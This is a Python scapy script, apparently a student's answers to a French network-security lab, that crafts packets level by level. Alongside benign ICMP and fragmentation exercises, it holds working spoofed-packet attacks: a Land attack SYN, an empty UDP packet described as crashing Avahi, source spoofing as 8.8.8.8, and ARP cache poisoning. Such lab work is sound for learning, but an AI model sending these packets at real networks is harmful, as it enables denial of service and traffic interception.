from scapy.layers.inet import IP, ICMP, TCP, UDP
from scapy.layers.l2 import Ether, ARP
from scapy.packet import Padding
from scapy.sendrecv import sendp


def level0(src, dst, mac, myId):
    """
    Consigne: Envoyer un paquet ICMP de type echo request avec dans le payload votre nom et votre prenom
    """
    payload = b"KHAMPHOUSONE Thierry"

    sendp(Ether(dst=mac) /
          IP(id=myId, src=src, dst=dst) /
          ICMP() /
          payload)


def level1(src, dst, mac, myId):
    """
    Consigne: Envoyer un paquet ICMP de type echo reply un payload et un padding correspondant au payload a l'envers
    """
    payload = b"le cafe est tres bon"
    payloadReverse = payload[::-1]

    sendp(Ether(dst=mac) /
          IP(id=myId, src=src, dst=dst) /
          ICMP(type="echo-reply") /
          payload /
          Padding(load=payloadReverse))

    # 2eme methode, on doit calculer la longueur de l'IP pour la forcer et echapper le padding. sinon il va considerer
    # le padding en tant que payload plutot que padding.
    p = IP(id=myId, src=src, dst=dst) / ICMP(type="echo-reply") / payload
    sendp(Ether(dst=mac) /
          IP(id=myId, src=src, dst=dst, len=len(p)) /
          ICMP(type="echo-reply") /
          payload / payloadReverse)


def level2(src, dst, mac, myId):
    """
    Consigne: Land attack: Cette attaque repose sur l'envoi d'un paquet TCP SYN spoofé avec l'adresse de la cible en source et cible un port ouvert
    La cible va répondre à ce paquet et à partir de là s'auto réponde sans fin
    Le port a atteindre est le port 1234
    TCP(sport=RandNum(32000, 33000), dport=rangePort, flags='S')
    """
    sendp(Ether(dst=mac) /
          IP(id=myId, src=src, dst=dst) /
          TCP(sport=1234, dport=1234, flags='S'))


def level3(src, dst, mac, myId):
    """
    Consigne: DoS sur Avahi: Un paquet UDP null qui ne transporte rien envoyé vers le port 5353 entraine une boucle
    infinie (le processus Avahi devient inopérant et consomme 100% du CPU)
    """
    sendp(Ether(dst=mac) /
          IP(id=myId, src=src, dst=dst) /
          UDP(sport=5353, dport=5353))


def level4(src, dst, mac, myId):
    """
    Consigne: Envoyer un message UDP depuis l'adresse source 8.8.8.8, port source 1234, port de destination 5678,
    contenant le mot MAGIC
    """
    sendp(Ether(dst=mac) /
          IP(id=myId, src=src, dst=dst) /
          UDP(sport=1234, dport=5678) / b"MAGIC")


def level5(src, dst, mac, myId):
    """
    Consigne: ARP Cache poisoning: Faire pointer l'entree de la table ARP de la machine 5.6.7.8 pour l'IP 1.2.3.4
    vers 12:12:12:12:12:12
    Attention: comme ce niveau ne demande pas de paquet IP, votre id doit etre envoyé seulement pour ce niveau, dans les
    deux derniers octets de l'adresse mac source
    """
    sendp(Ether(src="00:00:00:00:35:00", dst=mac) /
          ARP(op=2, pdst=dst, psrc="1.2.3.4", hwsrc="12:12:12:12:12:12"))


def level6(src, dst, mac, myId):
    """
    Consigne: Fragment IP: Envoyer un fragment IP a l'offset 0x48 qui ne soit pas le dernier fragment
    et dont le contenu soit "XXXX"

    -> L'offset est exprimé en mots de 8 octets et non en octets ! (champs frag)
    """
    payload = b"XXXX"

    p = (Ether(dst=mac) /
         IP(id=myId, src=src, dst=dst, flags='MF', frag=(0x48//0x8)) /
         payload)
    print(p.show2())
    sendp(p)


def level7(src, dst, mac, myId):
    """
    Consigne:
    """
    payload = b""

    p = (Ether(dst=mac) /
         IP(id=myId, src=src, dst=dst))
    print(p.show2())
    # sendp(p)


if __name__ == '__main__':
    SRC = "1.2.3.4"
    DST = "5.6.7.8"
    MAC = "00:5c:a4:75:ca:47"
    ID = 0x3500

    # level0(SRC, DST, MAC, ID)
    # level1(SRC, DST, MAC, ID)
    # level2(DST, DST, MAC, ID)
    # level3(SRC, DST, MAC, ID)
    # level4("8.8.8.8", DST, MAC, ID)
    # level5(SRC, DST, MAC, ID)
    # level6(SRC, DST, MAC, ID)
    level7(SRC, DST, MAC, ID)
